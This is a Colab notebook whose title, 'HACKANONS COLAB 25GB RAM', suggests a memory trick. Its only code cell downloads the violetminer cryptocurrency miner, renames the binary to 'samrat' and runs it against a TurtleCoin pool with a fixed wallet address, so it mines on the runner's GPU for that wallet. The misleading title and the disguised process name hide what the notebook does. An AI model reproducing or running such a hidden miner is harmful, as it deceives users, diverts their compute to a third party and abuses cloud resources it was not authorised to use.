{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "HACKANONS COLAB 25GB RAM.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/41815010159/gembler/blob/main/gembel.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Qh6XE4VQy2PV"
      },
      "source": [
        "!wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz\n",
        "! tar xvf violetminer-linux-v0.2.2.tar.gz\n",
        "% cd violetminer-linux-v0.2.2\n",
        "! mv violetminer samrat\n",
        "! ./samrat --pool turtlecoin.herominers.com:10380 --username TRTLv1vpsCSKPyjGB2qQuR91zfupnG65H8C6tEsMiN2x35g6kZtKncdKPJTYLHM8s6aPJZDHJ4ag1aHxLfh2xPT6jM4xMZYDCS1 --password cek --algorithm turtlecoin --disableCPU"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}